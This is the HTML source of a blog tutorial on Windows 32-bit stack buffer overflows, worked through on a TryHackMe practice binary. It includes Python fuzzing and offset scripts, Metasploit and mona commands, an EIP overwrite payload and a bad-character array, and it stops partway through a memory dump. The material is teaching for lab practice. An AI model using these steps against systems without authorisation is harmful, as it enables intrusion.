@@ -1,0 +1,493 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="" />
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+    href="https://omega-void.github.io/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+          href="https://omega-void.github.io/theme/pygments/tomorrow_night.min.css">
+
+
+  <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/font-awesome/css/solid.css">
+
+
+    <link href="https://omega-void.github.io/./feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="OmegaVoid - Blog of Many Things Atom">
+
+
+    <link rel="shortcut icon" href="https://omega-void.github.io/images/favicon.png" type="image/x-icon">
+    <link rel="icon" href="https://omega-void.github.io/images/favicon.png" type="image/x-icon">
+
+
+
+<meta name="author" content="OmegaVoid" />
+<meta name="description" content="The first of what&#39;s hopefully going to be a series on binary exploitation. We&#39;ll take a look at Windows 32bit Stack Buffer Overflows and show you why they are exploited the way they are. We&#39;ll also dive into some considerations about Buffer Overflows in general. And present an example of how to develop an exploit via this technique." />
+<meta name="keywords" content="tutorial, binexp, buffer overflows">
+
+
+<meta property="og:site_name" content="OmegaVoid - Blog of Many Things"/>
+<meta property="og:title" content="BinExp Corner: Episode 1 - Stack Buffer Overflows"/>
+<meta property="og:description" content="The first of what&#39;s hopefully going to be a series on binary exploitation. We&#39;ll take a look at Windows 32bit Stack Buffer Overflows and show you why they are exploited the way they are. We&#39;ll also dive into some considerations about Buffer Overflows in general. And present an example of how to develop an exploit via this technique."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="https://omega-void.github.io/binexp-corner-1-bofs.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2021-03-06 12:00:00+00:00"/>
+<meta property="article:modified_time" content="2021-03-06 12:00:00+00:00"/>
+<meta property="article:author" content="https://omega-void.github.io/author/omegavoid.html">
+<meta property="article:section" content="Tutorials"/>
+<meta property="article:tag" content="tutorial"/>
+<meta property="article:tag" content="binexp"/>
+<meta property="article:tag" content="buffer overflows"/>
+<meta property="og:image" content="https://omega-void.github.io/images/OV.png">
+
+  <title>OmegaVoid - Blog of Many Things &ndash; BinExp Corner: Episode 1 - Stack Buffer Overflows</title>
+
+</head>
+<body class="dark-theme">
+  <aside>
+    <div>
+      <a href="https://omega-void.github.io">
+        <img src="https://omega-void.github.io/images/OV.png" alt="OmegaVoid" title="OmegaVoid">
+      </a>
+
+      <h1>
+        <a href="https://omega-void.github.io">OmegaVoid</a>
+      </h1>
+
+<p>Blog of Many Things</p>
+
+
+      <ul class="social">
+          <li>
+            <a  class="sc-twitter" href="https://twitter.com/subitusnex" target="_blank">
+              <i class="fab fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a  class="sc-linkedin" href="https://www.linkedin.com/in/jo%C3%A3o-zamite-20988b2a/" target="_blank">
+              <i class="fab fa-linkedin"></i>
+            </a>
+          </li>
+          <li>
+            <a  class="sc-github" href="https://github.com/omega-void" target="_blank">
+              <i class="fab fa-github"></i>
+            </a>
+          </li>
+          <li>
+            <a  class="sc-rss" href="./feeds/all.atom.xml" target="_blank">
+              <i class="fas fa-rss"></i>
+            </a>
+          </li>
+      </ul>
+
+    </div>
+
+  </aside>
+  <main>
+
+    <nav>
+      <a href="https://omega-void.github.io">Home</a>
+
+      <a href="/category/rants.html">Rants</a>
+      <a href="/category/tutorials.html">Tutorials</a>
+      <a href="/archives.html">Archives</a>
+      <a href="/pages/about.html">About</a>
+
+     <!--       <a href="https://omega-void.github.io/./feeds/all.atom.xml">Atom</a>
+
+-->
+    </nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="binexp-corner-1-bofs">BinExp Corner: Episode 1 - Stack Buffer Overflows</h1>
+    <p>
+      Posted on Sat 06 March 2021 in <a href="https://omega-void.github.io/category/tutorials.html">Tutorials</a>
+
+    </p>
+  </header>
+
+
+  <div>
+    <p>This is hopefully the first in many in the series. Throughout these we'll look into several topics of Binary Exploitation. I wanted to do something to contribute a bit back to the <a href="http://tryhackme.com">TryHackMe.com</a> community since you have all taught me so much. And one thing I've noticed in the past 7 months since I've joined this THM is that a lot of people seem to be a little reticent about doing the stack buffer overflow rooms, because it seems complex and hard to understand — but they are not. So I thought that'd be a good place to start.</p>
+<p>Some of these exploits are really trivial to develop and can even be a somewhat relatively easy way to get points in a few certifications in the security industry.</p>
+<p>We will focus on Windows 32 bit Stack Buffer Overflows that execute shellcode, but it's important to make a point that not all buffer overflows are the same and they can do many things, stack buffer overflows can execute shellcode, overwrite variables, they can alter the flow of a program by forcing the execution of another function, and there are even other types of overflows like Heap Buffer Overflows which focus on a different region of memory and are a technique that was recently used in the Baron Samedit sudo exploit. If you end up curious about these things, be bold, explore, learn more. There are a lot of vulnerabilities out there to be found.</p>
+<p>Before anything else, a big shout out to Tib3rius and TheCyberMentor whose work really started me on the path to understanding these:</p>
+<p>If you'd like to see their content use these links:</p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=qSnPayW6F7U&amp;list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G">Overflows Made Easy by The Cyber Mentor</a></li>
+<li><a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst">Buffer Overflows on Tib3rius's github</a></li>
+</ul>
+<h2>Binary Exploitation</h2>
+<p>A quick note before we jump into analyzing the stack architecture, and what it means for us, hackers. Binary exploitation is a world of its own, with a multitude of things you can do when analyzing and exploiting binaries, so we'll leave a lot of the details about binary analysis for another post in the near future.</p>
+<p>For now it suffices that we explore Stack Architecture a little bit.</p>
+<blockquote>
+<p>There are several registers in 32 bit architecture which are temporary storage built into the CPU, but for simplicity we'll only look at EIP and ESP. These are:
+<br>The Instruction Pointer - which points at the next instruction to execute;<br>The Stack Pointer - which points at the top of the stack.</p>
+</blockquote>
+<h2>Stack Architecture</h2>
+<p>The user stack is a region of memory that contains the information required to run a program. It will include the saved registers, functions and their variables and arguments. The memory space after the user stack is unused memory and it is used as the stack grows. </p>
+<blockquote>
+<p>The Base of the stack is actually in higher memory addresses, and it grows to lower memory addresses. Here we will represent it with the base on the bottom of the picture since we're talking exclusively about the stack, but you will more likely see it represented with the base at the top and growing downwards elsewhere because of this.</p>
+</blockquote>
+<p>Each function in a program is given its own separate stack frame, to store local variables, arguments passed to the function etc. Each new stack frame is allocated when a function is called and deallocated when the function returns. </p>
+<p>Time for an example, let's take a look at a program based on this (admittedly ridiculous) piece of code:</p>
+<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="p">(){</span>
+    <span class="kt">int</span> <span class="n">num1</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">num2</span><span class="p">;</span>
+    <span class="n">func</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="n">func</span><span class="p">(){</span>
+    <span class="kt">int</span> <span class="n">num3</span><span class="p">;</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>So what happens here?</p>
+<p><img alt="What the binary would look like in the stack" src="/images/binexp-corner-1/stack1.png"></p>
+<ul>
+<li>The stack will firstly have our main function, and allocate its variables in its frame. ESP (the Stack Pointer) points at the top of the stack.</li>
+<li>When the function is called, the arguments for the function (in this case none) are pushed onto the stack (in reverse order) and then the call instruction is issued which does 2 things:<ol>
+<li>Pushes the return address onto the stack</li>
+<li>Modifies EIP to point to the start of the function</li>
+</ol>
+</li>
+<li>Then the variables of the function get pushed to the stack (in this case num3)</li>
+<li>Every time anything is pushed onto the stack ESP gets incremented so that it keeps pointing at the top of the stack.</li>
+</ul>
+<p>When the function is done executing:</p>
+<ul>
+<li>Return address is popped from the stack and written to the EIP so that the program can continue from that position.</li>
+<li>The stack pointer (ESP) is decremented to point back at the top of main's frame (now the top of the stack again).</li>
+</ul>
+<p>So, how do we use this to our advantage?</p>
+<h2>The Stack Buffer Overflow</h2>
+<p>Take the following code:</p>
+<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span> 
+<span class="kt">void</span> <span class="n">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Here, 2 interesting things happen:</p>
+<ol>
+<li>Buffers are loaded into memory in the opposite direction of the stack (towards the bottom of the stack).</li>
+<li>strcpy copies the argument to the buffer without checking the size of the buffer. (<code>printf</code>, <code>sprintf</code>, <code>strcat</code>, <code>strcpy</code>, and <code>gets</code> all have this problem)</li>
+</ol>
+<p>So, if we feed it 20 bytes of characters everything is fine. However, if we give it more than that something interesting happens.</p>
+<p>We start overwriting things — function variables if they exist, the return address, arguments, etc.</p>
+<p>This is a Stack buffer overflow.</p>
+<p><img alt="Stack exploitation leading to buffer overflow" src="/images/binexp-corner-1/stack2.png"></p>
+<p>There's a lot we can do to alter what a program does here. We could overwrite a variable to pass a condition, we can also overwrite the return address which, when the function returns, gets written into the EIP which in turn points at the next instruction to execute, so if we point it towards a function call or a jump we can alter the execution logic of a program. Seems promising doesn't it?</p>
+<p>But another thing we can also do is to overflow the stack even further and insert our own shell code into it. Then when the function returns our shell code will occupy space in the main function frame, and ESP will be pointing at our payload.</p>
+<p>All we have to do is get EIP to point at an address that has the instruction JMP ESP and our payload will execute.</p>
+<blockquote>
+<p>Modern OSs have protection mechanisms like ASLR (Address Space Layout Randomization) which randomly arranges the address space positions of the stack, heap and libraries making exploitation harder. In fact, its a big part of why buffer overflow exploits generate a large number of crash errors in the logs.<br>If you'd like to know more: <a href="https://github.com/r0hi7/BinExp/">r0hi7's github</a> is a great source of information on this, and also how to defeat it.</p>
+</blockquote>
+<h1>Practice</h1>
+<p>Ok, we know how this "should work" but let's actually do it. We'll go ahead and use OVERFLOW 4 on (LINK) to exemplify things.</p>
+<p>Our process will take the following steps:</p>
+<ol>
+<li>Writing code to interact with the Application and Fuzzing</li>
+<li>Finding the Offset and Overwriting the Return Address</li>
+<li>Finding Bad Characters</li>
+<li>Finding the Right Module</li>
+<li>Generating Shellcode and the NOP sled</li>
+<li>Getting a shell</li>
+</ol>
+<p>Seems a bit long but it's easier than it seems.</p>
+<h3>Preparation</h3>
+<p>Before all this, to develop an exploit this way we'd have to find a vulnerable binary, and getting it to our own testing system (either by downloading the binary if available, compiling it from source code, etc). The idea is to replicate the conditions of the target on our testing environment. For this we will need a windows VM. For the purpose of the Buffer Overflow Prep room we already have Immunity Debugger installed and the mona plugin. These will make our job a lot easier.</p>
+<p>You can grab the Immunity debugger here: <a href="https://debugger.immunityinc.com/">https://debugger.immunityinc.com/</a></p>
+<p>And you can get mona at: <a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p>
+<p>Before anything one thing we need to do is set the working folder for mona: <code>!mona config -set workingfolder c:\mona\%p</code> this way we'll know where the files mona generates get placed.</p>
+<p>However, I'll try to offer alternatives to relying solely on mona for this.</p>
+<p>So let's do this. We'll launch our binary on Immunity Debugger and execute it.</p>
+<p>Remember to reset the binary anytime it crashes.</p>
+<h3>Writing code to interact with the Application and Fuzzing</h3>
+<p>First of all one thing we need to do is figure out if and here an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.</p>
+<p>In a White Box approach you'd analyze the binary (or the source code) for functions you know are vulnerable to stack buffer overflows.</p>
+<p>In a Black Box approach you feed normal input to the application and see the application behaviour, and then feed it an extremely long input and see if the application crashes.</p>
+<p>If it crashes with a really long input, and we know it's a binary running, there's a good chance there's a Buffer Overflow there.</p>
+<blockquote>
+<p>If your binary is running locally it may error out with a Segmentation Fault.<br>
+This has become so common that some challenge creators have been known to print "Segmentation Fault" in an application just to create rabbit holes.<br>
+Trust your debugger.</p>
+</blockquote>
+<p>In our example we already know it's vulnerable. We'll feed it a long string of A characters and see it fail.</p>
+<p><img alt="BOF behavior with normal input vs a long string" src="/images/binexp-corner-1/bof1.png"></p>
+<p>Here we see that the application first responds normally to a test string, and then hangs when we feed it a large payload.</p>
+<p>So, we know this is vulnerable, and we want to attack it. We could do it all by hand, but it's probably a good idea to create a small script to do this for us, that way we don't have to deal with handling all the input by hand and messing up something and spending hours trying to understand why it didn't work. </p>
+<p>We will use Python 2.7 to develop our script for the simple fact that we will not have to deal with encodings in our script implementation. Python3 is fine, just make sure you encode everything correctly. That's outside the scope of this Tutorial, but feel free to play with it.</p>
+<p>Our first step is create a script that will increment our payload until it crashes. This will give us an approximation of where the offset to the return address.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">sys</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;&lt;target-ip&gt;&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">timeout</span> <span class="o">=</span> <span class="mi">20</span>
+
+<span class="n">fuzzString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">increment</span> <span class="o">=</span> <span class="mi">100</span>
+
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">fuzzString</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3000</span><span class="p">:</span>
+    <span class="n">fuzzString</span> <span class="o">+=</span> <span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">increment</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
+        <span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Fuzzing with </span><span class="si">%s</span><span class="s2"> bytes&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">fuzzString</span><span class="p">))</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;OVERFLOW4 &quot;</span> <span class="o">+</span> <span class="n">fuzzString</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Could not connect to &quot;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+
+<p>We execute it and get:</p>
+<p><img alt="Fuzzing the length of the buffer." src="/images/binexp-corner-1/bof2.png"></p>
+<p>We can see it breaks at around 2100 characters. Great, we have an approximation of what the offset to the return address, but if we want to know exactly where it is so we can overwrite it.</p>
+<h3>Finding the Offset and Overwriting EIP</h3>
+<p>We'll use a Cyclic Pattern which is a known sequence of characters in a specific order which will help us identify the offset until we hit the return address. </p>
+<p>Metasploit has a tool for exactly this purpose, we'll create a payload a bit bigger than 2100 just to make sure we hit the return address.</p>
+<p><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2300</code></p>
+<p>We alter our script to use this.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;&lt;target-ip&gt;&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">timeout</span> <span class="o">=</span> <span class="mi">20</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&lt;cyclic pattern&gt;&quot;</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
+    <span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Attempting a string of length = </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;OVERFLOW4 &quot;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Could not connect to &quot;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div>
+
+<p>We execute this and we see that the application crashes, and in Immunity Debugger we see:</p>
+<p><img alt="The value of EIP after the cyclic pattern is used in the overflow" src="/images/binexp-corner-1/bof3.png"></p>
+<p><code>70433570</code> - is the value of the EIP when we fed it the cyclic payload. We have two options of using this to get the value of the offset.</p>
+<p>The first is to use the metasploit pattern_offset.rb tool to do this:</p>
+<p><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l &lt;length&gt; -q &lt;EIP value&gt;</code></p>
+<p>The second is to use the immunity plugin, mona:</p>
+<p><code>!mona findmsp -distance &lt;length&gt;</code></p>
+<p>(findmsp - read find metasploit pattern)</p>
+<p>We get an offset of 2026 bytes.</p>
+<p>If all went well we should be able to overwrite our EIP with "BBBB" if we feed it a string:</p>
+<p><code>payload = 'A' * 2026 + 'BBBB'</code></p>
+<p><img alt="EIP Overwritten" src="/images/binexp-corner-1/bof4.png"></p>
+<p>Success. The hex representation of BBBB is 4242424242. We control the the EIP.</p>
+<h3>Finding Bad Characters</h3>
+<p>Now, there's a thing we need to account for which is bad characters. These are characters that get modified by the program when loading things into the buffer. </p>
+<p>This is important because if we use these in either the EIP or the shellcode it will break our exploit. Character <code>'\x00'</code> is always a bad characters so we don't need to look for that one.</p>
+<p>What we do to identify this is to send a string with all the individual distinct hex codes to the application (after the EIP) and then comparing it to what actually gets stored in memory.</p>
+<p>So we need a bytearray with all the possible combinations. We can grab this from google:</p>
+<div class="highlight"><pre><span></span><code><span class="n">badChars</span> <span class="o">=</span> <span class="p">(</span>
+<span class="s2">&quot;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span>
+<span class="p">)</span>
+</code></pre></div>
+
+<p>Or we can just use <code>mona</code> again.</p>
+<p><code>!mona bytearray -b "\x00"</code></p>
+<p>The result gets stored in our working folder.</p>
+<p>Then we feed this to the application (after overwritting EIP).</p>
+<p>We can see in immunity debugger already that ESP is pointing at the remainder our payload. And we can either compare what's in memory via a script of our making, or look at which bytes are out of sequence.</p>
+<div class="highlight"><pre><span></span><code><span class="mi">01</span> <span class="mi">02</span> <span class="mi">03</span> <span class="mi">04</span> <span class="mi">05</span> <span class="mi">06</span> <span class="mi">07</span> <span class="mi">08</span> <span class="mi">09</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">B</span> <span class="mi">0</span><span class="n">C</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">E</span> <span class="mi">0</span><span class="n">F</span> <span class="mi">10</span> <span class="mi">11</span> <span class="mi">12</span> <span class="mi">13</span> <span class="mi">14</span> <span class="mi">15</span> <span class="mi">16</span> <span class="mi">17</span> <span class="mi">18</span> <span class="mi">19</span> <span class="mi">1</span><span class="n">A</span> <span class="mi">1</span><span class="n">B</span> <span class="mi">1</span><span class="n">C</span> <span class="mi">1</span><span class="n">D</span> <span class="mi">1</span><span class="n">E</span> <span class="mi">1</span><span class="n">F</span> <span class="mi">20</span>
+<span class="mi">21</span> <span class="mi">22</span> <span class="mi">23</span> <span class="mi">24</span> <span class="mi">25</span> <span class="mi">26</span> <span class="mi">27</span> <span class="mi">28</span> <span class="mi">29</span> <span class="mi">2</span><span class="n">A</span> <span class="mi">2</span><span class="n">B</span> <span class="mi">2</span><span class="n">C</span> <span class="mi">2</span><span class="n">D</span> <span class="mi">2</span><span class="n">E</span> <span class="mi">2</span><span class="n">F</span> <span class="mi">30</span> <span class="mi">31</span> <span class="mi">32</span> <span class="mi">33</span> <span class="mi">34</span> <span class="mi">35</span> <span class="mi">36</span> <span class="mi">37</span> <span class="mi">38</span> <span class="mi">39</span> <span class="mi">3</span><span class="n">A</span> <span class="mi">3</span><span class="n">B</span> <span class="mi">3</span><span class="n">C</span> <span class="mi">3</span><span class="n">D</span> <span class="mi">3</span><span class="n">E</span> <span class="mi">3</span><span class="n">F</span> <span class="mi">40</span>
+<span class="mi">41</span> <span class="mi">42</span> <span class="mi">43</span> <span class="mi">44</span> <span class="mi">45</span> <span class="mi">46</span> <span class="mi">47</span> <span class="mi">48</span> <span class="mi">49</span> <span class="mi">4</span><span class="n">A</span> <span class="mi">4</span><span class="n">B</span> <span class="mi">4</span><span class="n">C</span> <span class="mi">4</span><span class="n">D</span> <span class="mi">4</span><span class="n">E</span> <span class="mi">4</span><span class="n">F</span> <span class="mi">50</span> <span class="mi">51</span> <span class="mi">52</span> <span class="mi">53</span> <span class="mi">54</span> <span class="mi">55</span> <span class="mi">56</span> <span class="mi">57</span> <span class="mi">58</span> <span class="mi">59</span> <span class="mi">5</span><span class="n">A</span> <span class="mi">5</span><span class="n">B</span> <span class="mi">5</span><span class="n">C</span> <span class="mi">5</span><span class="n">D</span> <span class="mi">5</span><span class="n">E</span> <span class="mi">5</span><span class="n">F</span> <span class="mi">60</span>
+<span class="mi">61</span> <span class="mi">62</span> <span class="mi">63</span> <span class="mi">64</span> <span class="mi">65</span> <span class="mi">66</span> <span class="mi">67</span> <span class="mi">68</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">A</span> <span class="mi">6</span><span class="n">B</span> <span class="mi">6</span><span class="n">C</span> <span class="mi">6</span><span class="n">D</span> <span class="mi">6</span><span class="n">E</span> <span class="mi">6</span><span class="n">F</span> <span class="mi">70</span> <span class="mi">71</span> <span class="mi">72</span> <span class="mi">73</span> <span class="mi">74</span> <span class="mi">75</span> <span class="mi">76</span> <span class="mi">77</span> <span class="mi">78</span> <span class="mi">79</span> <span class="mi">7</span><span class="n">A</span> <span class="mi">7</span><span class="n">B</span> <span class="mi">7</span><span class="n">C</span> <span class="mi">7</span><span class="n">D</span> <span class="mi">7</span><span class="n">E</span> <span class="mi">7</span><span class="n">F</span> <span class="mi">80</span>
+<span class="mi">81</span> <span class="mi">82</span> <span class="mi">83</span> <span class="mi">84</span> <span class="mi">85</span> <span class="mi">86</span> <span class="mi">87</span> <span class="mi">88</span> <span class="mi">89</span> <span class="mi">8</span><span class="n">A</span> <span class="mi">8</span><span class="n">B</span> <span class="mi">8</span><span class="n">C</span> <span class="mi">8</span><span class="n">D</span> <span class="mi">8</span><span class="n">E</span> <span class="mi">8</span><span class="n">F</span> <span class="mi">90</span> <span class="mi">91</span> <span class="mi">92</span> <span class="mi">93</span> <span class="mi">94</span> <span class="mi">95</span> <span class="mi">96</span> <span class="mi">97</span> <span class="mi">98</span> <span class="mi">99</span> <span class="mi">9</span><span class="n">A</span> <span class="mi">9</span><span class="n">B</span> <span class="mi">9</span><span class="n">C</span> <span class="mi">9</span><span class="n">D</span> <span class="mi">9</span><span class="n">E</span> <span class="mi">9</span><span class="n">F</span> <span class="n">A0</span>
